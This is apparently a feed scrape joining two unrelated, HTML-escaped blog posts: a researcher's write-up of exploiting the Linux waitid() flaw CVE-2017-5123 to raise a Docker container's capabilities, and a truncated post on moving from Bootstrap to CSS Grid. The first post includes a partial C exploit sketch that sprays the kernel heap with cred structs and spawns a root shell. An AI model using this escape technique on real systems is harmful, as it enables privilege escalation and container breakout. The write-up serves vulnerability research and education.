<description>&lt;div class=&quot;post-author-info&quot;&gt;

&lt;p&gt;Dec 27, 2017&lt;/p&gt;
&lt;div class=&quot;post-author-name&quot;&gt;by &lt;a href=&quot;https://www.twistlock.com/author/daniel-shapira/&quot; title=&quot;Posts by Daniel Shapira&quot; class=&quot;author url fn&quot; rel=&quot;author&quot;&gt;Daniel Shapira&lt;/a&gt;&lt;/div&gt;
&lt;span class=&quot;social-share&quot;&gt;share:&lt;/span&gt;

&lt;/div&gt;&lt;p&gt;This post describes how I exploited the &lt;code&gt;waitid()&lt;/code&gt; vulnerability in order to modify the &lt;a href=&quot;https://www.kernel.org/pub/linux/libs/security/linux-privs/kernel-2.2/capfaq-0.2.txt&quot;&gt;Linux capabilities&lt;/a&gt; of a Docker container to gain elevated privileges, and ultimately escape the container jail.&lt;/p&gt;
&lt;p&gt;But before we dive in, since an image is worth a thousand words, here is my exploit in action. It modifies the containerized process capabilities structure in memory, resulting in a gain of &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt; and &lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; capabilities. This results in the ability to enable promiscuous mode on &lt;code&gt;eth0&lt;/code&gt; ( docker bridge for the container):&lt;/p&gt;

&lt;p&gt;&lt;iframe width=&quot;960&quot; height=&quot;540&quot; src=&quot;https://www.youtube.com/embed/IdRDFS4u2rQ?feature=oembed&quot; frameborder=&quot;0&quot; gesture=&quot;media&quot; allow=&quot;encrypted-media&quot; allowfullscreen=&quot;&quot;&gt;[embedded content]&lt;/iframe&gt;&lt;/p&gt;
&lt;p&gt;Note that I have turned off &lt;code&gt;Kernel ASLR&lt;/code&gt; for the recording, but it also works with &lt;code&gt;KASLR&lt;/code&gt; as we can find the kernel base and the heap base by using the same vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://access.redhat.com/security/cve/cve-2017-5123&quot;&gt;CVE-2017-5123&lt;/a&gt; was published earlier this year on Oct 12 — it was a Linux kernel vulnerability in the &lt;a href=&quot;http://uw714doc.sco.com/en/man/html.2/waitid.2.html&quot;&gt;&lt;strong&gt;waitid()&lt;/strong&gt;&lt;/a&gt; syscall for 4.12-4.13 kernel versions. The &lt;code&gt;waitid()&lt;/code&gt; syscall defined as :&lt;/p&gt;
&lt;pre&gt;
int waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options);
&lt;/pre&gt;
&lt;p&gt;The vulnerability allows an attacker to write a partially-controlled data to kernel memory address of his choice. The kernel memory address can be provided as the &lt;code&gt;infop&lt;/code&gt; pointer above. The pointer points to a &lt;code&gt;struct siginfo&lt;/code&gt; described below. In this struct we can control several variables, specifically &lt;code&gt;pid&lt;/code&gt; and &lt;code&gt;status&lt;/code&gt;&lt;em&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As you can see below, the control is rather indirect.&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
struct siginfo {
    int si_signo;
    int si_errno;
    int si_code;
    int padding;   // this remains unchanged by waitid
    int pid;       // process id
    int uid;       // user id
    int status;    // return code
}
&lt;/pre&gt;
&lt;br/&gt;Most of the values cannot be controlled by us or are limited in their size for our needs, however we can control the &lt;code&gt;pid&lt;/code&gt; value by creating a lot of processes with the help of &lt;code&gt;fork()&lt;/code&gt; or &lt;code&gt;clone()&lt;/code&gt; until we hit the desired &lt;code&gt;pid&lt;/code&gt; value. Still, we are limited by the &lt;code&gt;PID_MAX&lt;/code&gt; value of the system, which is by default configured to be &lt;code&gt;32768&lt;/code&gt; which equals to &lt;code&gt;0x8000&lt;/code&gt; in hex.
&lt;p&gt;Note: In a non-containerized environment we could elevate this number after changing our &lt;code&gt;uid&lt;/code&gt; to 0 and gain root privileges, as we could modify &lt;code&gt;/proc/sys/kernel/pid_max&lt;/code&gt; to any number.&lt;/p&gt;

&lt;h2&gt;&lt;strong&gt;Linux Capabilities&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In this section I’ll focus on a short overview of Linux capabilities – what they are, how Docker uses them, and how they are represented in the memory.&lt;/p&gt;
&lt;p&gt;The code snippet below is taken from &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/include/linux/cred.h&quot;&gt;&lt;em&gt;linux/cred.h&lt;/em&gt;&lt;/a&gt; and is the definition of the credentials struct that each process has:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC    0x43736564
#define CRED_MAGIC_DEAD    0x44656144
#endif
    kuid_t        uid;        /* real UID of the task */
    kgid_t        gid;        /* real GID of the task */
    kuid_t        suid;        /* saved UID of the task */
    kgid_t        sgid;        /* saved GID of the task */
    kuid_t        euid;        /* effective UID of the task */
    kgid_t        egid;        /* effective GID of the task */
    kuid_t        fsuid;        /* UID for VFS ops */
    Kgid_t    fsgid; /* GID for VFS ops */
    Unsigned    securebits; /* SUID-less security management */
    Kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    Kernel_cap_t    cap_permitted;    /* caps we're permitted */
    Kernel_cap_t    cap_effective;    /* caps we can actually use */
    Kernel_cap_t    cap_bset; /* capability bounding set */
    kernel_cap_t    cap_ambient; /* Ambient capability set */

&lt;/pre&gt;
&lt;br/&gt;&lt;strong&gt;man capabilities:&lt;/strong&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as &lt;em&gt;capabilities&lt;/em&gt;, which can be independently enabled and disabled.&lt;br/&gt;Capabilities are a per-thread attribute.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Linux capabilities are stored inside each process’s own &lt;code&gt;cred struct&lt;/code&gt; and represented by a bitmask. For example all caps enabled would be represented by a bitmask of &lt;code&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Each capability provides a different set of permissions, for instance:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CAP_SYS_MODULE&lt;/code&gt;  – allows for loading &amp;amp; unloading kernel modules.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CAP_NET_ADMIN&lt;/code&gt; – allows for various network operations. For example entering promiscuous mode, interface configuration and more.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt; – enables a range of system administration operations such as quotactl, mount, umount, swapon, setdomainname, ptrace and much more (this cap gives the most privileges and overloads others).&lt;/p&gt;
&lt;p&gt;You can find the full list of CAPS &lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;over here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Docker uses capabilities to provide a better isolation for containers. It simply drops capabilities that would enable container escape. For example, you will rarely see a container that is running out-of-the-box with any of the 3 capabilities above, as it would be a security concern if a container could access the network interface and sniff the traffic of other containers or the host itself, or if a user inside the container could mount directories on the host and load kernel modules.&lt;/p&gt;
&lt;p&gt;Although it might be easier to build a &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;ROP chain&lt;/a&gt; and call &lt;code&gt;commit_creds(0)&lt;/code&gt; in order to gain root with full capabilities, in order to learn more about heap spraying, I decided to go with the blind exploitation method by spraying the kernel heap with thousands of &lt;code&gt;struct creds&lt;/code&gt; like Federico did. The downside of the this exploit is that full caps are impossible to reach as we are not in control of what we are writing (we are limited to 0x8000) and the value of &lt;code&gt;0xFFFFFFFFFFFFFFFF&lt;/code&gt; is out of reach for us.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;The vulnerability&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The code snippet below is taken from &lt;a href=&quot;https://github.com/torvalds/linux/blob/master/kernel/exit.c#L1596&quot;&gt;&lt;em&gt;kernel/exit.c&lt;/em&gt;&lt;/a&gt; and is in charge of handling the &lt;code&gt;waitid()&lt;/code&gt; syscall:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
SYSCALL_DEFINE5(waitid, int, which, pid_t, upid, struct siginfo __user *,
        infop, int, options, struct rusage __user *, ru)
{
    struct rusage r;
    struct waitid_info info = {.status = 0};
    long err = kernel_waitid(which, upid, &amp;amp;amp;info, options, ru ? &amp;amp;amp;r : NULL);
    int signo = 0;

    if (err &amp;amp;gt; 0) {
        signo = SIGCHLD;
        err = 0;
        if (ru &amp;amp;amp;&amp;amp;amp; copy_to_user(ru, &amp;amp;amp;r, sizeof(struct rusage)))
            return -EFAULT;
    }
    if (!infop)
        return err;

    if (!access_ok(VERIFY_WRITE, infop, sizeof(*infop)))
        return -EFAULT;

    user_access_begin();
    unsafe_put_user(signo, &amp;amp;amp;infop-&amp;amp;gt;si_signo, Efault);
    unsafe_put_user(0, &amp;amp;amp;infop-&amp;amp;gt;si_errno, Efault);
    unsafe_put_user(info.cause, &amp;amp;amp;infop-&amp;amp;gt;si_code, Efault);
    unsafe_put_user(info.pid, &amp;amp;amp;infop-&amp;amp;gt;si_pid, Efault);
    unsafe_put_user(info.uid, &amp;amp;amp;infop-&amp;amp;gt;si_uid, Efault);
    unsafe_put_user(info.status, &amp;amp;amp;infop-&amp;amp;gt;si_status, Efault);
    user_access_end();
    return err;
Efault:
    user_access_end();
    return -EFAULT;
}

&lt;/pre&gt;
&lt;br/&gt;The vulnerability is that the highlighted &lt;code&gt;access_ok()&lt;/code&gt; check, which ensures that the user specified pointer is in fact a user-space pointer, was missing in the &lt;code&gt;waitid()&lt;/code&gt; syscall. Without this check a user can supply a kernel address pointer and the syscall will write to it without objections when executing &lt;code&gt;unsafe_put_user&lt;/code&gt;.&lt;br/&gt;As we already know – we can’t simply write whatever we want, but we will have to try to gain as much as we can within these limitations.
&lt;p&gt;&lt;code&gt;Info.status&lt;/code&gt; is a 32 bit int, but the value of status is constrained to &lt;code&gt;0 &amp;amp;lt; status &amp;amp;gt; 256&lt;/code&gt; as we can see in the &lt;a href=&quot;http://tldp.org/LDP/abs/html/exitcodes.html&quot;&gt;exit codes documentation&lt;/a&gt;, and as we already know &lt;code&gt;pid&lt;/code&gt; is constrained by &lt;code&gt;MAX_PID&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;At this point we have the ability to write a value of &lt;code&gt;pid&lt;/code&gt; :  &lt;code&gt;0&lt;/code&gt; &amp;lt; &lt;code&gt;pid&lt;/code&gt; &amp;lt; &lt;code&gt;0x8000&lt;/code&gt; to anywhere we want. The next challenge is to detect where we should write in order to successfully overwrite the desired values.&lt;/p&gt;
&lt;p&gt;We need to remember that the syscall will actually write 6 different fields each time we execute it, as there will be 6 executions of &lt;code&gt;unsafe_put_user()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;So we will need to take into account the offset of &lt;code&gt;pid&lt;/code&gt; inside the &lt;code&gt;infop struct&lt;/code&gt; and use it to subtract that value from the target address that we want to write to, the target address is then passed into &lt;code&gt;waitid()&lt;/code&gt; syscall as the &lt;code&gt;infop&lt;/code&gt; pointer.&lt;/p&gt;
&lt;p&gt;Our main goal with this exploit is to overwrite the capabilities that Docker sets for us, thus gaining additional privileges and to escape the container.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Spray n’ Pray&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;I decided to take an approach similar to Federico, so I proceeded to spray the kernel heap with thousands of &lt;code&gt;struct creds&lt;/code&gt; and then start guessing by writing to various addresses and pray to hit my target.&lt;/p&gt;
&lt;p&gt;By picking a value that we can track such as &lt;code&gt;uid&lt;/code&gt; (which we can track with &lt;code&gt;getuid()&lt;/code&gt;).&lt;br/&gt;We can, with a little bit a luck, pinpoint our &lt;code&gt;struct cred&lt;/code&gt; location, after which we will be able to write to specific offsets in order to overwrite the &lt;code&gt;capabilities&lt;/code&gt;, &lt;code&gt;gid&lt;/code&gt;, &lt;code&gt;euid&lt;/code&gt; and anything else we want.&lt;br/&gt;But in order to do that we need to figure out the actual offsets, which we will do with the help of &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-5851&quot; src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png&quot; alt=&quot;&quot; width=&quot;733&quot; height=&quot;170&quot; srcset=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/gdb.png 733w, https://www.twistlock.com/wp-content/uploads/2017/12/gdb-300x70.png 300w&quot; sizes=&quot;(max-width: 733px) 100vw, 733px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;As we can see, &lt;code&gt;kuid_t&lt;/code&gt; is 4 bytes in size, as such if we found uid on &lt;code&gt;0xFFFF880023cc1004&lt;/code&gt; than &lt;code&gt;gid&lt;/code&gt; will be at &lt;code&gt;0xFFFF880023cc1008&lt;/code&gt;, 4 bytes above, and &lt;code&gt;euid&lt;/code&gt; will be at &lt;code&gt;0xFFFF880023CC1014&lt;/code&gt; which is 4*0x4=0x10 bytes above our &lt;code&gt;uid&lt;/code&gt; address as illustrated in the diagram below.&lt;/p&gt;
&lt;p&gt;&lt;img class=&quot;alignnone size-full wp-image-5854&quot; src=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png&quot; alt=&quot;&quot; width=&quot;414&quot; height=&quot;440&quot; srcset=&quot;https://www.twistlock.com/wp-content/uploads/2017/12/diagram.png 414w, https://www.twistlock.com/wp-content/uploads/2017/12/diagram-282x300.png 282w&quot; sizes=&quot;(max-width: 414px) 100vw, 414px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;So essentially in order to overwrite our caps we will have to write to:&lt;br/&gt;&lt;code&gt;address_of_uid+0x4*8 = address_of_uid+0x20 = address_of_cap_inheritable&lt;/code&gt;&lt;br/&gt;Note: These addresses are relevant to my system, your addresses might differ.&lt;/p&gt;
&lt;p&gt;In order to find out where our sprayed &lt;code&gt;cred structs&lt;/code&gt; might land in the heap we will use &lt;code&gt;gdb&lt;/code&gt; again and set a breakpoint on &lt;code&gt;sys_getuid&lt;/code&gt; in order to break when our program calls &lt;code&gt;getuid()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;A few step commands after the breakpoint (it took 5 on my system) should reveal the &lt;code&gt;cred struct&lt;/code&gt; address in the &lt;code&gt;RAX&lt;/code&gt; register.&lt;/p&gt;
&lt;p&gt;We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the &lt;code&gt;struct cred&lt;/code&gt; is most likely to be in the heap&lt;/p&gt;
&lt;p&gt;So the plan is as follows:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Spawn thousands of processes by calling &lt;code&gt;fork()&lt;/code&gt; in order to create thousands of &lt;code&gt;cred structs&lt;/code&gt; in the kernel heap and make each of the processes constantly check if its UID==0 by calling &lt;code&gt;getuid()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Start writing the value 0 to addresses to which the &lt;code&gt;struct cred-&amp;amp;gt;uid&lt;/code&gt; might land&lt;/li&gt;
&lt;li&gt;If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the &lt;code&gt;uid&lt;/code&gt; value with our guesses from step 2. Now we can overwrite the rest of the &lt;code&gt;cred struct&lt;/code&gt; and change caps by writing to the offsets that we determined.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;Our dirty exploit will be something to the effect of:&lt;br/&gt;&lt;/p&gt;
&lt;pre&gt;
void writecaps(char *addr,unsigned long value){
while(1) {
      int pid = clone(exit_func, &amp;amp;amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
      if (!pid) {
        exit(0);
      }
      if (pid == value) {
        syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
        break;
      }
}

void spraynpray(){
pid_t pid;
FILE *f;
char *argv[] = {&quot;/bin/sh&quot;, NULL};
for (int i=0;i&amp;amp;lt;5000;i++)
{
    pid = fork();
    if (pid==0)
    { // child process
  while (1) {
    
    if (*glob_var==1) {
      syscall(SYS_exit, 0);
    }
    if (getuid() == 0){
        //FOUND!!
    printf(&quot;[+] Got UID: 0 !\n&quot;);
     *glob_var = 1;
     writecaps((char *)finalcapsaddress,value);
    printf(&quot;Done, spawning a shell \n&quot;);
    execve(&quot;/bin/sh&quot;, argv, NULL);
    }
}
    }

    else if(pid&amp;amp;lt;0)
    {
        printf(&quot;failed to fork&quot;);
    }

    else //parent process
    {

    }
}
}

void swapuid(){

    char* i,p;
    while(*glob_var!=1)
    {
    for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
        {
        if(*glob_var==1)
            {
            break;
            }
        printf(&quot;trying %p\n&quot;,i);
        syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
        sleep(1);
        }
    }
munmap(glob_var, sizeof *glob_var);
printf(&quot;Found uid on %p\n&quot;,i-0xc0);
sleep(10000);
}

int main(void)
{
    glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    *glob_var = 0;

unsigned long* base = findbase();
    findheapbase();
    spraynpray();
    swapuid();
}

&lt;/pre&gt;
&lt;br/&gt;After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.
&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;In 2017 alone, &lt;a href=&quot;https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33&quot;&gt;434 linux kernel exploits where found&lt;/a&gt;, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient.

<title>From Bootstrap to CSS Grid</title>

<description>&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

&lt;img class=&quot;graf-image&quot; data-image-id=&quot;0*pkfyT6WJt5lNNKkH.&quot; data-width=&quot;610&quot; data-height=&quot;198&quot; src=&quot;https://cdn-images-1.medium.com/max/1600/0*pkfyT6WJt5lNNKkH.&quot;/&gt;&lt;/div&gt;
&lt;p name=&quot;fd36&quot; id=&quot;fd36&quot; class=&quot;graf graf--p graf-after--figure&quot;&gt;Despite many clever hacks and creative workarounds, there hasn’t been a simple answer for creating layout on the web. From misusing tables, to over-engineering simple floats that push around content, developers have consistently struggled to translate designs to code. Developers have been saying for years that there has to be a better way to create responsive websites, and finally, there is: CSS Grid, a proper layout tool for the web baked right into CSS itself, is here. It’s fantastic! It’s exactly what we’ve been waiting for! And yet, it seems to me that developers are hesitating. What’s the hold up?&lt;/p&gt;
&lt;h4 name=&quot;8d16&quot; id=&quot;8d16&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“There’s no way I can start using CSS Grid yet”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;ef59&quot; id=&quot;ef59&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;You’re absolutely ready to declare display: grid if you’re the only person contributing code. However, if you’re working with a bigger team, on an older project or are faced with some real-world constraints, there may be some challenges ahead of you:&lt;/p&gt;
&lt;ul class=&quot;postList&quot;&gt;&lt;li name=&quot;99cb&quot; id=&quot;99cb&quot; class=&quot;graf graf--li graf-after--p&quot;&gt;Your designers have heard, “No, you can’t do that, that’s not how layout on the web works,” too many times, so they’re not designing anything that calls for you to learn CSS Grid.&lt;/li&gt;
&lt;li name=&quot;0b6c&quot; id=&quot;0b6c&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;Your developers have heard, “You can’t use that yet, we still have to support x browser,” too many times. They don’t dare dream that all of the excitement about CSS Grid can apply to them quite yet — adding CSS Grid is out of scope.&lt;/li&gt;
&lt;li name=&quot;27a8&quot; id=&quot;27a8&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;You’re on a tight deadline and you’re still not over how long it took you to really wrap your head around Flexbox. You promise yourself that you’ll take the time learn CSS Grid next time… for the next project… someday.&lt;/li&gt;
&lt;/ul&gt;&lt;p name=&quot;29a9&quot; id=&quot;29a9&quot; class=&quot;graf graf--p graf-after--li&quot;&gt;If any of the scenarios above sound familiar, then start small with Progressive Enhancement. Use &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/@supports&quot; data-href=&quot;https://developer.mozilla.org/en-US/docs/Web/CSS/@supports&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;feature queries&lt;/a&gt; to enhance your components with CSS Grid, and worry about deleting old code later. Use the time to show the potential of CSS Grid to your designers. Learn without worrying. You might have to override some styles, but the gains will outweigh the temporary extra code.&lt;/p&gt;
&lt;h3 name=&quot;81b6&quot; id=&quot;81b6&quot; class=&quot;graf graf--h3 graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h3-strong&quot;&gt;Gridlock&lt;/strong&gt;&lt;/h3&gt;
&lt;h4 name=&quot;a321&quot; id=&quot;a321&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--h3&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“That sounds nice, but I can’t use CSS Grid, we’re still on Bootstrap!”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;d0f3&quot; id=&quot;d0f3&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Don’t let that stop you from progressively enhancing your app with the new and exciting features of CSS!&lt;/p&gt;
&lt;p name=&quot;16b4&quot; id=&quot;16b4&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;CSS is a powerful tool and remarkably flexible. I made an &lt;a href=&quot;https://codepen.io/tallys/pen/bRrLYV&quot; data-href=&quot;https://codepen.io/tallys/pen/bRrLYV&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;example on Codepen&lt;/a&gt; that embraces CSS Grid without removing the Bootstrap code or functionality for old browsers. Try it out, resize your browser, and then toggle off the CSS Grid enhancement. I tried to make just about every breakpoint a little different to show the creativity and flexibility made possible with CSS Grid. Fork it, play around and make something new. It’s just an example, and I hope you have fun with it.&lt;/p&gt;

Codepen Example
&lt;h4 name=&quot;7e6b&quot; id=&quot;7e6b&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--figure&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Why didn’t you just use Bootstrap? There’s hardly any difference!”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;dd84&quot; id=&quot;dd84&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Yeah, yeah. Listen, I get that I could have just used Bootstrap and called it a day; it works just fine, and it’s incredibly fast to throw together once it’s already on a project. That’s why it’s still the fallback.&lt;/p&gt;
&lt;p name=&quot;d8af&quot; id=&quot;d8af&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;But once you get a glimpse of the future, it’s hard to stay in the past. I have seen the power and potential of CSS Grid and I wanted to start using it. Or, more specifically:&lt;/p&gt;
&lt;ul class=&quot;postList&quot;&gt;&lt;li name=&quot;f8e6&quot; id=&quot;f8e6&quot; class=&quot;graf graf--li graf-after--p&quot;&gt;I didn’t want to declare a height to accommodate the maximum content. I would much rather have the rows know how tall each item should be.&lt;/li&gt;
&lt;li name=&quot;21e1&quot; id=&quot;21e1&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted the option of having variable widths for each item, and I didn’t want to have them be split evenly or predictably all of the time.&lt;/li&gt;
&lt;li name=&quot;e22f&quot; id=&quot;e22f&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I was bored by having to always think in terms of 12 columns. Lots of websites use 12 columns and they all look the same.&lt;/li&gt;
&lt;li name=&quot;e796&quot; id=&quot;e796&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I felt trapped by fixed breakpoints for columns, and I wanted to set my own breakpoints to best serve my content.&lt;/li&gt;
&lt;li name=&quot;6e6c&quot; id=&quot;6e6c&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I didn’t want to keep making the choice between affecting global layout rules and writing hacky overrides.&lt;/li&gt;
&lt;li name=&quot;5c64&quot; id=&quot;5c64&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted to easily change the gap between my columns. Sometimes a 3px column gap is all you need.&lt;/li&gt;
&lt;li name=&quot;44fa&quot; id=&quot;44fa&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;I wanted to be able to set a min and max for each item and let the browser figure out how many items fit in each row. I am a huge fan of letting the browser do the math.&lt;/li&gt;
&lt;li name=&quot;53c5&quot; id=&quot;53c5&quot; class=&quot;graf graf--li graf-after--li&quot;&gt;It took about three lines of CSS to write the grid layout I wanted, and I wanted to live in the bright and beautiful future where layout is always that simple.&lt;/li&gt;
&lt;/ul&gt;&lt;p name=&quot;9550&quot; id=&quot;9550&quot; class=&quot;graf graf--p graf-after--li&quot;&gt;Most importantly, I wanted to be excited about layout on the web again, and I wanted the designers I work with to feel the same.&lt;/p&gt;
&lt;h4 name=&quot;4c90&quot; id=&quot;4c90&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Won’t I just be writing throwaway code?”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;bb9d&quot; id=&quot;bb9d&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;CSS Grid isn’t a hack, it’s a proper layout tool for the web. You don’t need to install anything, you don’t need a preprocessor, and you don’t need to twist your brain into knots just to understand how it works.&lt;/p&gt;
&lt;p name=&quot;f65f&quot; id=&quot;f65f&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;Using CSS Grid doesn’t mean writing throwaway code — the throwaway code will be the old code you’ll want to delete when the timing is right, and that will be much sooner than you think: Chrome, Firefox and Safari all support CSS Grid, and soon Edge 16 will support CSS Grid, too.&lt;/p&gt;
&lt;h4 name=&quot;c21b&quot; id=&quot;c21b&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--p&quot;&gt;“That’s nice in theory, but what about in practice?”&lt;/h4&gt;
&lt;p name=&quot;cc84&quot; id=&quot;cc84&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;Turns out, it’s pretty great in practice, too. I implemented this CSS Grid progressive enhancement on &lt;a href=&quot;https://www.nytimes.com/watching&quot; data-href=&quot;https://www.nytimes.com/watching&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;The New York Times Watching&lt;/a&gt; media card component. Users on old browsers see Bootstrap, but users on browsers that support the display: grid property get the CSS Grid enhanced styles including the thin column gutters that our designers envisioned. Plus, next time there’s a redesign, our designers know they aren’t beholden to the old way of doing layout on the web. It may not look like it right now, but it’s actually a major step forward.&lt;/p&gt;

&lt;p name=&quot;53ad&quot; id=&quot;53ad&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;There are so many great resources out there! Personally, I recommend checking out the following:&lt;/p&gt;
&lt;p name=&quot;4ae6&quot; id=&quot;4ae6&quot; class=&quot;graf graf--p graf-after--p&quot;&gt;&lt;strong class=&quot;markup--strong markup--p-strong&quot;&gt;Online Resources:&lt;/strong&gt; Amazing work done by &lt;a href=&quot;https://twitter.com/jensimmons&quot; data-href=&quot;https://twitter.com/jensimmons&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Jen Simmons&lt;/a&gt; (labs.jensimmons.com) and &lt;a href=&quot;https://twitter.com/rachelandrew&quot; data-href=&quot;https://twitter.com/rachelandrew&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;Rachel Andrew&lt;/a&gt; (rachelandrew.co.uk). Both are experts on CSS Grid and I am grateful for their hard work in pushing the web forward.&lt;/p&gt;

Trust me, being able to visualize the changes you’re making is key. Visit some websites that are already using CSS Grid in production, inspect, and play around in the browser dev tools. A great place to start is the very instructional &lt;a href=&quot;http://labs.jensimmons.com/&quot; data-href=&quot;http://labs.jensimmons.com/&quot; class=&quot;markup--anchor markup--p-anchor&quot; rel=&quot;noopener&quot; target=&quot;_blank&quot;&gt;labs.jensimmons.com&lt;/a&gt;.&lt;/p&gt;

The “waffle” icon in Firefox.
&lt;h4 name=&quot;cc1e&quot; id=&quot;cc1e&quot; class=&quot;graf graf--h4 graf--startsWithDoubleQuote graf-after--figure&quot;&gt;&lt;strong class=&quot;markup--strong markup--h4-strong&quot;&gt;“Great! I’ve got my resources, I’ve downloaded Firefox, and I’m ready to display: grid… but there is no place in my company’s project where I can try this out for real.”&lt;/strong&gt;&lt;/h4&gt;
&lt;p name=&quot;c7bb&quot; id=&quot;c7bb&quot; class=&quot;graf graf--p graf-after--h4&quot;&gt;There are a couple of good places to start. Do you have anything that’s only used internally? For example, I think one of the &lt;em class=&quot;markup--em markup--p-em&quot;&gt;best&lt;/em&gt; places to start is with your style guide. (If you don’t have a style guide, get one and start documenting your design patterns!) To start, you can lay out your blocks of brand colors with CSS Grid.&lt;/p&gt;
&lt;div class=&quot;aspectRatioPlaceholder is-locked&quot;&gt;

